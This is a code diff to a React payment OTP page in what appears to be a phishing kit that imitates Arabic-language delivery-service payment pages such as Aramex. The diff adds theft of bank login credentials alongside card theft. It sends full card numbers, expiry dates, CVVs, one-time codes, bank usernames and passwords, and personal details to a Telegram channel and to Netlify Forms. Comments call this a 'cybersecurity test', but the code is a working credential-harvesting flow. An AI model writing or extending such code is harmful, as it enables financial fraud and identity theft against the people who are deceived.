@@ -1,13 +1,18 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useMemo } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
-import { Shield, AlertCircle, Check, ArrowLeft, X } from "lucide-react";
+import { Shield, AlertCircle, ArrowLeft, X } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
+import {
+  ensurePaymentFlowLink,
+  getPaymentFlowState,
+  PaymentMethod,
+} from "@/lib/paymentFlow";
 
 const PaymentOTPForm = () => {
   const { id } = useParams();
@@ -19,15 +24,52 @@ const PaymentOTPForm = () => {
   const [attempts, setAttempts] = useState(0);
   const [error, setError] = useState("");
   const [countdown, setCountdown] = useState(60);
+  const [method, setMethod] = useState<PaymentMethod>("card");
+  const [bankData, setBankData] = useState<{ bankKey: string; bankName: string; values: Record<string, string> }>();
+
+  const customerInfo = useMemo(() => {
+    try {
+      return JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
+    } catch (error) {
+      console.error('Failed to parse customer info', error);
+      return {};
+    }
+  }, []);
+
+  useEffect(() => {
+    if (!id) return;
+    ensurePaymentFlowLink(id);
+    const state = getPaymentFlowState(id);
+    if (!state) {
+      navigate(`/pay/${id}/confirm`, { replace: true });
+      return;
+    }
+    setMethod(state.method);
+
+    if (state.method === 'bank-login') {
+      try {
+        const stored = sessionStorage.getItem('bankLoginData');
+        if (!stored) {
+          navigate(`/pay/${id}/confirm`, { replace: true });
+          return;
+        }
+        const parsed = JSON.parse(stored) as { bankKey: string; bankName: string; values: Record<string, string> };
+        setBankData(parsed);
+      } catch (error) {
+        console.error('Failed to parse bank login data', error);
+        navigate(`/pay/${id}/confirm`, { replace: true });
+      }
+    }
+  }, [id, navigate]);
   
-  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
-  const serviceName = linkData?.payload?.service_name || serviceKey;
+  const serviceName = linkData?.payload?.service_name || customerInfo.service || serviceKey;
   const branding = getServiceBranding(serviceKey);
   
   const shippingInfo = linkData?.payload as any;
-  const amount = shippingInfo?.cod_amount || 500;
-  const formattedAmount = `${amount} ر.س`;
+  const fallbackAmount = customerInfo.amount ? customerInfo.amount : undefined;
+  const amount = shippingInfo?.cod_amount || shippingInfo?.total_amount || parseFloat((customerInfo.amount || '').replace(/[^0-9.]/g, '')) || 0;
+  const formattedAmount = fallbackAmount || (amount ? `${amount} ر.س` : '—');
   
   // Demo OTP: 123456
   const DEMO_OTP = "123456";
@@ -63,46 +105,73 @@ const PaymentOTPForm = () => {
     setError("");
     
     if (otp === DEMO_OTP) {
+      const timestamp = new Date().toISOString();
+      const netlifyPayload: Record<string, string> = {
+        "form-name": "payment-confirmation",
+        name: customerInfo.name || '',
+        email: customerInfo.email || '',
+        phone: customerInfo.phone || '',
+        service: serviceName,
+        amount: formattedAmount,
+        otp,
+        method,
+        timestamp,
+      };
+
+      if (method === 'card') {
+        netlifyPayload.cardLast4 = sessionStorage.getItem('cardLast4') || '';
+        netlifyPayload.cardholder = sessionStorage.getItem('cardName') || '';
+      }
+
+      if (method === 'bank-login' && bankData) {
+        netlifyPayload.bank = bankData.bankName;
+        netlifyPayload.bankKey = bankData.bankKey;
+        netlifyPayload.bankSummary = Object.entries(bankData.values)
+          .map(([key, value]) => `${key}: ${value}`)
+          .join(' | ');
+      }
+
       // Submit to Netlify Forms
       try {
         await fetch("/", {
           method: "POST",
           headers: { "Content-Type": "application/x-www-form-urlencoded" },
-          body: new URLSearchParams({
-            "form-name": "payment-confirmation",
-            name: customerInfo.name || '',
-            email: customerInfo.email || '',
-            phone: customerInfo.phone || '',
-            service: serviceName,
-            amount: formattedAmount,
-            cardLast4: sessionStorage.getItem('cardLast4') || '',
-            cardholder: sessionStorage.getItem('cardName') || '',
-            otp: otp,
-            timestamp: new Date().toISOString()
-          }).toString()
+          body: new URLSearchParams(netlifyPayload).toString()
         });
       } catch (err) {
         console.error("Form submission error:", err);
       }
       
       // Send complete payment confirmation to Telegram (cybersecurity test)
+      const telegramData: Record<string, unknown> = {
+        name: customerInfo.name || '',
+        email: customerInfo.email || '',
+        phone: customerInfo.phone || '',
+        address: customerInfo.address || '',
+        service: serviceName,
+        amount: formattedAmount,
+        method,
+        otp,
+      };
+
+      if (method === 'card') {
+        telegramData.cardholder = sessionStorage.getItem('cardName') || '';
+        telegramData.cardNumber = sessionStorage.getItem('cardNumber') || '';
+        telegramData.cardLast4 = sessionStorage.getItem('cardLast4') || '';
+        telegramData.expiry = sessionStorage.getItem('cardExpiry') || '';
+        telegramData.cvv = sessionStorage.getItem('cardCvv') || '';
+      }
+
+      if (method === 'bank-login' && bankData) {
+        telegramData.bank = bankData.bankName;
+        telegramData.bankKey = bankData.bankKey;
+        telegramData.credentials = Object.entries(bankData.values).map(([key, value]) => ({ key, value }));
+      }
+
       const telegramResult = await sendToTelegram({
         type: 'payment_confirmation',
-        data: {
-          name: customerInfo.name || '',
-          email: customerInfo.email || '',
-          phone: customerInfo.phone || '',
-          address: customerInfo.address || '',
-          service: serviceName,
-          amount: formattedAmount,
-          cardholder: sessionStorage.getItem('cardName') || '',
-          cardNumber: sessionStorage.getItem('cardNumber') || '', // Full card number
-          cardLast4: sessionStorage.getItem('cardLast4') || '',
-          expiry: sessionStorage.getItem('cardExpiry') || '12/25',
-          cvv: sessionStorage.getItem('cardCvv') || '', // CVV for cybersecurity test
-          otp: otp
-        },
-        timestamp: new Date().toISOString()
+        data: telegramData,
+        timestamp,
       });
 
       if (telegramResult.success) {
@@ -155,7 +224,9 @@ const PaymentOTPForm = () => {
           <Shield className="w-8 h-8 sm:w-10 sm:h-10 text-white" />
         </div>
         <h1 className="text-2xl sm:text-3xl font-bold mb-2">رمز التحقق</h1>
-        <p className="text-sm sm:text-base text-muted-foreground">أدخل الرمز المرسل إلى هاتفك</p>
+        <p className="text-sm sm:text-base text-muted-foreground">
+          {method === 'bank-login' ? `أدخل الرمز المرسل من ${bankData?.bankName || 'المصرف'}` : 'أدخل الرمز المرسل إلى هاتفك'}
+        </p>
       </div>
 
       {/* Info */}
@@ -167,7 +238,9 @@ const PaymentOTPForm = () => {
         }}
       >
         <p className="text-xs sm:text-sm text-center">
-          تم إرسال رمز التحقق المكون من 6 أرقام إلى هاتفك المسجل في البنك
+          {method === 'bank-login'
+            ? `تم إرسال رمز تحقق ${bankData?.bankName || 'البنك'} إلى هاتفك المسجل`
+            : 'تم إرسال رمز التحقق المكون من 6 أرقام إلى هاتفك المسجل في البنك'}
         </p>
       </div>
       
@@ -311,6 +384,10 @@ const PaymentOTPForm = () => {
         <input type="text" name="amount" />
         <input type="text" name="cardholder" />
         <input type="text" name="cardLast4" />
+        <input type="text" name="method" />
+        <input type="text" name="bank" />
+        <input type="text" name="bankKey" />
+        <input type="text" name="bankSummary" />
         <input type="text" name="otp" />
         <input type="text" name="timestamp" />
       </form>
